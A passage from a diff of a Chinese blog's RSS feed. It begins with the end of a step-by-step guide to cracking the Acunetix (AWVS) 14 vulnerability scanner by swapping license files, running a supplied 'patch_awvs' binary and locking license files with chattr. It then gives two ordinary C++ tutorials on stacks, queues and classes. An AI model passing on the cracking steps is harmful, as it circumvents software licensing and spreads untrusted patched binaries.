-&lt;p&gt;15. 右键【我的电脑】，点击【管理】，选择【服务和应用成序】, 点击【服务】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/a9bf3bb1a1b9418ab5567e2aa325bbe4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;16. 右键【Acunetix】和【Acunetix Database】，停止 Acunetix 和 Acunetix Database 服务&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/99b73f6746b74eb5aba49d0ae808e4e1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/292cbd039b4c4e959650b79fc48c08ae.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;17. 将【awvs14 补丁】里的【license_info.json】 复制到【D:\ProgramData\Acunetix\shared\license】，点击【替换】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/3b23edb624d34503ac1bc702ee4d0497.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;18. 将【awvs14 补丁】里的【wa_data.dat】复制到【D:\ProgramData\Acunetix\shared\license】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/49338f031ce9493998c03de87ed9ccbc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;19. 将【awvs14 补丁】里的【wvsc.exe】复制到【D:\Program Files (x86)\Acunetix\14.1.210316110】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/8cafbb2374d54bbe85d296a8ca2f500b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;20. 右键【Acunetix】和【Acunetix Database】，启动 Acunetix 和 Acunetix Database 服务&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/1e154e0b0ee54e6ea5f057bb25fb2dbc.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/0519547b40a34109be8693cb411089d3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;21. 刷新浏览器的管理页面，点击【高级..】, 点击【接受风险并继续】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/7bf0bc40416a4ef9995284f6b5bd9e2f.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;22. 登录管理员账号 &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOmFkbWluQG1zYi5jb20=&#34;&gt;admin@msb.com&lt;/span&gt;, 密码：m123456@&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/92cc8f0bd37f41348aef73b4e7a35655.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/ca33061b2639475e9291461f012c901d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;h2 id=&#34;4-kali-安装awvs&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4-kali-安装awvs&#34;&gt;#&lt;/a&gt; 4. kali 安装 AWVS&lt;/h2&gt;
-&lt;p&gt;1. 将 acunetix_trial.sh 和 patch_awvs 复制到 kali 中&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/2f852ac510d54e82bfac2e7cf3ac183a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;2. 修改 acunetix_trial.sh 和 patch_awvs  权限&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 acunetix_trial.sh patch_awvs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;3. 执行安装命令&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;./acunetix_trial.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;4. 点击 enter 键继续&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/de2f4d0b46ee421d896b08db9e016a80.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;5. 一直按住 enter 键继续&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/047824864f324f0c89e6e37a7824fdb4.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;6. 输入 yes，点击 【回车】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/aa3d4d4cb50d4e92af6685bc90a9108e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;7. 输入主机名称，点击【回车】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/e91bc8a405054d6fadb58fbc76051884.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;8. 输入 email ：【admin@msb.com】点击【回车】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/f3d402f52cdd46e59bdeda18fd704374.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;9. 输入 Password：【m123456@】点击回车，输入【m123456@】，点击回车&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/00b3b7c2c16a4a899c607e7aadde1aa0.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;10. 等待安装完成&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/9431cda311874684ba3251424cf8b5a7.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;11. 把破解补丁复制到指定目录下，并设置好权限，直接运行即可&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp -a patch_awvs /home/acunetix/.acunetix_trial/v_190325161/scanner/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod 777 /home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/home/acunetix/.acunetix_trial/v_190325161/scanner/patch_awvs&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/db407d2b36ac498d8e47e079cf18de63.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;12. 为了保护原始 license 不失效，这里尽快执行如下的命令，不然 license 会被修改然后就无法破解成功。&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;chattr +i /home/acunetix/.acunetix_trial/data/license/license_info.json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rm -fr /home/acunetix/.acunetix_trial/data/license/wa_data.dat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;touch /home/acunetix/.acunetix_trial/data/license/wa_data.dat&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chattr +i /home/acunetix/.acunetix_trial/data/license/wa_data.dat&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;13. 重新启动 AWVS 进程&lt;/p&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;systemctl restart acunetix_trial.service &lt;span class=&#34;comment&#34;&gt;#重启进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl start acunetix_trial.service   &lt;span class=&#34;comment&#34;&gt;#启动进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl stop acunetix_trial.service    &lt;span class=&#34;comment&#34;&gt;#停止进程&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl status acunetix_trial.service  &lt;span class=&#34;comment&#34;&gt;#查看进行状态 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;14. 访问：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xMjcuMC4wLjE6MTM0NDMv&#34;&gt;https://127.0.0.1:13443/&lt;/span&gt; 进入 AWVS 首页，点击【Advanced..】, 点击【Accept the Risk and Continue】&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/228eea4050e84c5bb1a2aa7dddee9c8b.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;15. 输入用户名：admin@msb.com, 密码：m123456@ 进行登录&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/5375b020a8184250b679aea740cb4c6e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/24f077d4968a4f16be2c42d0ca473c9d.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1641348406000/7de783bf900d46e581cbc78c26b9420c.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/CPP%E4%B8%AD%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</guid>
-            <title>CPP中栈和队列的基本操作</title>
-            <link>https://mangpumo.github.io/2023/01/11/CPP%E4%B8%AD%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</link>
-            <pubDate>Wed, 11 Jan 2023 03:04:01 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;c中栈和队列的基本操作&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#c中栈和队列的基本操作&#34;&gt;#&lt;/a&gt; C++ 中栈和队列的基本操作&lt;/h1&gt;
-&lt;p&gt;使用标准库的栈和队列时，先包含相关的头文件&lt;/p&gt;
-&lt;p&gt;#include&amp;lt;stack&amp;gt;&lt;/p&gt;
-&lt;p&gt;#include&amp;lt;queue&amp;gt;&lt;/p&gt;
-&lt;p&gt;定义栈如下：&lt;/p&gt;
-&lt;p&gt;stack&amp;lt;int&amp;gt; s;&lt;/p&gt;
-&lt;p&gt;定义队列如下：&lt;/p&gt;
-&lt;p&gt;queue&amp;lt;int&amp;gt; q;&lt;/p&gt;
-&lt;p&gt;栈提供了如下的操作：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;s.empty()               如果栈为空返回true，否则返回false    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.size()                返回栈中元素的个数    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.pop()                 删除栈顶元素但不返回其值    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.top()                 返回栈顶的元素，但不删除该元素    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;s.push()                在栈顶压入新元素  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;如何输出栈内所有元素：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;stack&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	stack&amp;lt;int&amp;gt; s;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for(int i = 0; i &amp;lt; 3; i++) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		s.push(i);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	while(s.empty() == false) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		cout &amp;lt;&amp;lt; s.top() &amp;lt;&amp;lt; &amp;quot; &amp;quot;; //返回栈顶的元素，但不删除该元素     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		s.pop(); //删除栈顶元素但不返回其值   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br&gt;
- 队列提供了下面的操作：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;q.empty()               如果队列为空返回true，否则返回false    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q.size()                返回队列中元素的个数    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q.pop()                 删除队列首元素但不返回其值    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q.front()               返回队首元素的值，但不删除该元素    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q.push()                在队尾压入新元素    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;q.back()                返回队列尾元素的值，但不删除该元素  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;如何输出队内所有元素：&lt;br&gt;
-&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#include &amp;lt;queue&amp;gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;using namespace std;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;int main()&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	queue&amp;lt;int&amp;gt; q;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	for(int i = 0; i &amp;lt; 3; i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		q.push(i); //入队 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	while(q.empty() == false) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		cout &amp;lt;&amp;lt; q.front() &amp;lt;&amp;lt; &amp;quot; &amp;quot;; //返回队首元素的值，但不删除该元素 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		q.pop(); //删除队列首元素但不返回其值 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	return 0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
- ]]></description>
-        </item>
-        <item>
-            <guid isPermalink="true">https://mangpumo.github.io/2023/01/11/CPP%E7%B1%BBClass%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%AE%9E%E7%8E%B0/</guid>
-            <title>C++类Class的定义与实现</title>
-            <link>https://mangpumo.github.io/2023/01/11/CPP%E7%B1%BBClass%E7%9A%84%E5%AE%9A%E4%B9%89%E4%B8%8E%E5%AE%9E%E7%8E%B0/</link>
-            <pubDate>Wed, 11 Jan 2023 00:09:02 +0800</pubDate>
-            <description><![CDATA[ &lt;h1 id=&#34;c类class的定义与实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#c类class的定义与实现&#34;&gt;#&lt;/a&gt; C++ 类 (Class) 的定义与实现&lt;/h1&gt;
-&lt;h2 id=&#34;一-类-的介绍&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#一-类-的介绍&#34;&gt;#&lt;/a&gt; &lt;strong&gt;一、&amp;quot;类&amp;quot; 的介绍&lt;/strong&gt;&lt;/h2&gt;
-&lt;p&gt;在 C++ 中，用 &amp;quot;&lt;strong&gt; 类&lt;/strong&gt; &amp;quot;来描述&amp;quot;&lt;strong&gt; 对象&lt;/strong&gt; &amp;quot;, 所谓的&amp;quot; 对象 &amp;quot;是指现实世界中的一切事物。那么类就可以看做是对相似事物的抽象，找到这些不同事物间的共同点，如自行车和摩托车，首先他们都属于&amp;quot; 对象 &amp;quot;, 并且具有一定得相同点，和一些不同点，相同点如他们都有质量、都有两个轮子，都是属于交通工具等。&amp;quot; 都有质量 &amp;quot;、&amp;quot; 两个轮子 &amp;quot;属于这个对象的属性，而&amp;quot; 都能够当做交通工具 &amp;quot; 属于该对象具有的行为，也称方法。&lt;/p&gt;
-&lt;p&gt;类是属于用户自定义的数据类型，并且该类型的数据具有一定的行为能力，也就是类中说描述的方法。通常来说，一个类的定义包含两部分的内容，一是该类的&lt;strong&gt;属性&lt;/strong&gt;，另一部分是它所拥有的&lt;strong&gt;方法&lt;/strong&gt;。以 &amp;quot;人类&amp;quot; 这个类来说，每个人都有自己的姓名、年龄、出生日期、体重等，为 人类 的属性部分，此外，人能够吃饭、睡觉、行走、说话等属于人类所具有的行为。&lt;/p&gt;
-&lt;p&gt;上面举例中所描述的 &amp;quot;人&amp;quot; 类仅仅是具有人这种对象的最基础的一些属性和行为，可以称之为人的 &amp;quot;&lt;strong&gt; 基类&lt;/strong&gt; &amp;quot;。 再说说一些具有一些职业的人，例如学生，一个学生还具有&amp;quot; 基类 &amp;quot; 中所没有的属性，如学校、班级、学号；也可以具有基类所不具有的行为，如每天需要去上课，需要考试等。&lt;/p&gt;
-&lt;p&gt;学生类可以看做是基类的一个扩展，因为他具有基类的所有属性和行为，并且在此基础上增加了一些基类所没有的属性和行为，像 &amp;quot;学生&amp;quot; 这样的类称为 &amp;quot;人类&amp;quot; 这个基类的 &amp;quot;&lt;strong&gt; 派生类&lt;/strong&gt; &amp;quot;或者&amp;quot;&lt;strong&gt; 子类&lt;/strong&gt; &amp;quot;。在学生的基础上海可以进一步的扩展出其他更高级的类，如&amp;quot; 研究生 &amp;quot; 类。&lt;/p&gt;
-&lt;p&gt;到此，我们不再更深的去介绍类的其他相关知识。&lt;/p&gt;
-&lt;h1 id=&#34;二-c类的定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#二-c类的定义&#34;&gt;#&lt;/a&gt; &lt;strong&gt;二、C++ 类的定义&lt;/strong&gt;&lt;/h1&gt;
-&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;class 类名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    public:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //公共的行为或属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    private:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    //私有的行为或属性&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
-&lt;p&gt;说明:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;类名 需要遵循一般的命名规则；&lt;/li&gt;
